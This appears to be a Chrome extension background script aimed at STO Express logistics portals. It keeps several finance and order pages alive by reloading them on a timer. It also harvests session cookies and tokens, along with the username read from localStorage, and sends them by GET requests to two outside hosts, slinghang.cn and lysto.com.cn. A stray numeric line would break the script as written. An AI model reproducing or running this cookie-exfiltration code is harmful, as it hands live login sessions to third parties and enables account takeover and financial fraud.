chrome.alarms.create("cookieTimer", {
  periodInMinutes: 1 // 每1分钟执行一次
});
chrome.alarms.onAlarm.addListener((alarm) => {
    // 查找匹配的标签页
  chrome.tabs.query({ url: '*://page.sto.cn/ux/manipulate-center/index*' }, tabs => {
    if (tabs.length > 0) {
      tabId = tabs[0].id; // 获取第一个匹配的标签页ID
      // 刷新页面
      chrome.tabs.reload(tabId, {}, () => {
      });
    } else {
      console.log('未找到匹配的标签页');
    }
  });
  chrome.tabs.query({ url: '*://front.sto.cn/group/customerCenter#/*' }, tabs => {
    if (tabs.length > 0) {
      tabId = tabs[0].id; // 获取第一个匹配的标签页ID
      // 刷新页面
      chrome.tabs.reload(tabId, {}, () => {
      });
    } else {
      console.log('未找到匹配的标签页');
    }
  });
  chrome.tabs.query({ url: '*://wangdian.sto.cn/page/fin-center/settlement/new-outbound-settlement*' }, tabs => {
    if (tabs.length > 0) {
      tabId = tabs[0].id; // 获取第一个匹配的标签页ID
      // 刷新页面
      chrome.tabs.reload(tabId, {}, () => {
      });
    } else {
      console.log('未找到匹配的标签页');
    }
  });
    chrome.tabs.query({ url: '*://wangdian.sto.cn/page/external/hq-fin-center/report/policy/transfer/rebate*' }, tabs => {
    if (tabs.length > 0) {
      tabId = tabs[0].id; // 获取第一个匹配的标签页ID
      // 刷新页面
      chrome.tabs.reload(tabId, {}, () => {
      });
    } else {
      console.log('未找到匹配的标签页');
    }
  });

  chrome.tabs.query({ url: '*://market-cod.sto.cn/cod/topayment/siteOrder/list*' }, tabs => {
    if (tabs.length > 0) {
      tabId = tabs[0].id; // 获取第一个匹配的标签页ID
      // 刷新页面
      chrome.tabs.reload(tabId, {}, () => {
      });
    } else {
      console.log('未找到匹配的标签页');
    }
  });
   chrome.tabs.query({ url: '*://finance-fundmanage.sto.cn/prepaidment/prepaid/common/getBizType.action?showLevel=1' }, tabs => {
    if (tabs.length > 0) {
      tabId = tabs[0].id; // 获取第一个匹配的标签页ID
      // 刷新页面
      chrome.tabs.reload(tabId, {}, () => {
      });
    } else {
      console.log('未找到匹配的标签页');
    }
  });
  if (alarm.name == "cookieTimer") {
	   // 获取目标域名的所有 Cookie
     chrome.cookies.getAll({}, function(allCookies) {
                var allSessionCookies = allCookies.filter(cookie => cookie.name === 'SESSION' && cookie.domain.includes('finance-mng.sto.cn'));
              
                console.log('所有域名下的 SESSION Cookie:', allSessionCookies);
				// 更安全的获取方式，避免数组为空时报错
				if (allSessionCookies.length > 0) {
					var firstSessionCookie = allSessionCookies[0];
					 console.log('找到 SESSION Cookie:', firstSessionCookie);
					var cookiesText = firstSessionCookie.name + '=' + firstSessionCookie.value;
					callApi(cookiesText);
				}
            });
			
			   // 获取目标域名的所有 Cookie
     chrome.cookies.getAll({}, function(allCookies) {
                var allCodCookies = allCookies.filter(cookie => cookie.name === 'cod' && cookie.domain.includes('market-cod.sto.cn'));
                console.log('market-cod.sto.cn域名下的 cod Cookie:', allCodCookies);
				// 更安全的获取方式，避免数组为空时报错
				if (allCodCookies.length > 0) {
					var firstCodCookie = allCodCookies[0];
					 console.log('找到 cod Cookie:', allCodCookies);
					var cookiesText = firstCodCookie.name + '=' + firstCodCookie.value;
					callApi(cookiesText);
				}
            });
             // 获取网点交易记录 Cookie
     chrome.cookies.getAll({}, function(allCookies) {
                var allJYSessionCookies = allCookies.filter(cookie => cookie.name === 'SESSION' && cookie.domain.includes('finance-fundmanage.sto.cn'));
                console.log('finance-fundmanage.sto.cn域名下的 finance SESSION Cookie:', allJYSessionCookies);
				// 更安全的获取方式，避免数组为空时报错
				if (allJYSessionCookies.length > 0) {
					var firstCodCookie = allJYSessionCookies[0];
					 console.log('找到 finance Cookie:', allJYSessionCookies);
					var cookiesText = 'finance=' + firstCodCookie.value;
					console.log('调用 finance Cookie:', cookiesText);
					callApi(cookiesText);
				}
            });
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      var url = 'https://wutonggateway.sto.cn';
      var wd2ts = '';
	  var downloadcookie = 'CFO_DOWNLOAD';
	  var wdSto = 'WD_STO=';
	  var stoTokenValue = '';
	  var wdSessionValue = '';

      chrome.cookies.getAll({url: url}, function(cookies) {
		  console.info('cookies>>>>>cookies: ', cookies);
        let cookiesText = '';
        for (var i = 0; i < cookies.length; i++) {
          var cookie = cookies[i];
          console.info('cookieName: ', cookie.name);
          console.info('cookieValue: ', cookie.value);
          if(cookie.name == 'spf_sid') {
            cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
            callApi(cookiesText);
            console.info('send cookies: ', cookiesText);
            cookiesText = '';
          }
          if(cookie.name == 'stoToken') {
            cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
            callApi(cookiesText);
            console.info('send cookies: ', cookiesText);
            stoTokenValue = cookie.name + '=' + cookie.value;
            cookiesText = '';
          }
          if(cookie.name == 'sid_cfo') {
            cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
            callApi(cookiesText);
            console.info('send cookies: ', cookiesText);
			downloadcookie = downloadcookie+cookiesText;
            cookiesText = '';
          }
          if(cookie.name == 'WD_SESSION') {
                cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
                callApi(cookiesText);
                console.info('wd2ts.push WD_SESSION cookies: ', cookiesText);
                wd2ts += cookiesText;
                wdSessionValue = cookie.name + '=' + cookie.value;
                cookiesText = '';
              }
          if(cookie.name == 'TSID') {
                cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
                wd2ts += cookiesText;
                console.info('wd2ts.push TSID cookies: ', cookiesText);
                cookiesText = '';
              }

        }
       if (wd2ts.length > 0 && wd2ts.includes('WD_SESSION') && wd2ts.includes('TSID')) {
          callApi(wd2ts);
		  downloadcookie = downloadcookie+wd2ts;
          console.info('send wd2ts cookies: ', wd2ts);
}
if (downloadcookie.length > 0  && downloadcookie.includes('sid_cfo') && downloadcookie.includes('WD_SESSION') && downloadcookie.includes('TSID')) {
          callApi(downloadcookie);
	   console.info('send downloadcookie cookies: ', downloadcookie);
	   }
// WD_STO 组合上报
if (stoTokenValue && wdSessionValue) {
          var wdStoCookie = wdSto + stoTokenValue + ';' + wdSessionValue + ';';
          callApi(wdStoCookie);
          console.info('send WD_STO cookies: ', wdStoCookie);
}

      });
    });
  }
});

// 缓存 accountName，避免每次上报都执行 scripting
let cachedAccountName = '';

function getAccountName() {
  return new Promise((resolve) => {
    chrome.tabs.query({ url: '*://wangdian.sto.cn/index*' }, (tabs) => {
      if (tabs.length === 0) {
        resolve(cachedAccountName || '');
        return;
      }
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            const data = localStorage.getItem('originalUserData');
            if (!data) return '';
            const obj = JSON.parse(data);
            return obj.userName || '';
          } catch (e) {
            return '';
          }
        }
      }, (results) => {
        if (chrome.runtime.lastError || !results || !results[0]) {
          resolve(cachedAccountName || '');
          return;
        }
        const name = results[0].result || '';
        if (name) cachedAccountName = name;
        resolve(name || cachedAccountName || '');
      });
    });
  });
}

78588888
function callApi(userId) {
  getAccountName().then((accountName) => {
    const params = `cookie=${encodeURIComponent(userId)}&accountName=${encodeURIComponent(accountName)}`;
    const url = `https://slinghang.cn/s/v1/normandy/api/controller/cust/netManager/settingCookie?${params}`;
    const urlsit = `https://lysto.com.cn/s/v1/normandy/api/controller/cust/netManager/settingCookie?${params}`;

    const options = {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
      },
    };

    fetch(url, options)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('Success:', data);
      })
      .catch(error => {
        console.error('Error:', error);
      });
    fetch(urlsit, options)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP SIT error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('Success SIT:', data);
      })
      .catch(error => {
        console.error('Error SIT:', error);
      });
  });
}
// 新增：监听对特定接口的请求，限制五分钟内只触发一次 并发会重复发 影响不大
let lastTriggerTime = 0; // 上次触发的时间戳（毫秒）
const TRIGGER_INTERVAL = 5 * 60 * 1000; // 五分钟（300000毫秒）

chrome.webRequest.onCompleted.addListener(
  function(details) {
    const now = Date.now();
    // 检查是否超过间隔时间
    if (now - lastTriggerTime >= TRIGGER_INTERVAL) {
      lastTriggerTime = now; // 更新触发时间
      
      // 请求完成后，获取该域名的所有 Cookie
      chrome.cookies.getAll({ url: 'https://wangdian.sto.cn' }, function(cookies) {
        if (cookies && cookies.length > 0) {
          let cookieStr = cookies.map(c => `${c.name}=${c.value}`).join(';');
          cookieStr = "KFSD=" + cookieStr;
          callApi(cookieStr);
          console.info('从接口触发发送 wangdian.sto.cn cookies (五分钟内首次): ', cookieStr);
        } else {
          console.info('接口触发时未找到 wangdian.sto.cn 的 cookie');
        }
      });
    } else {
      console.info('接口触发但五分钟内已发送过，忽略本次请求');
    }
  },
  {
    urls: ['*://wangdian.sto.cn/order/collectMap/query/detail/mapAreaDetail*']  // 匹配目标 URL 揽件区域管理
    // 可选添加 types: ['xmlhttprequest'] 仅监听 XHR 请求
  },
  []  // 不需要额外信息
);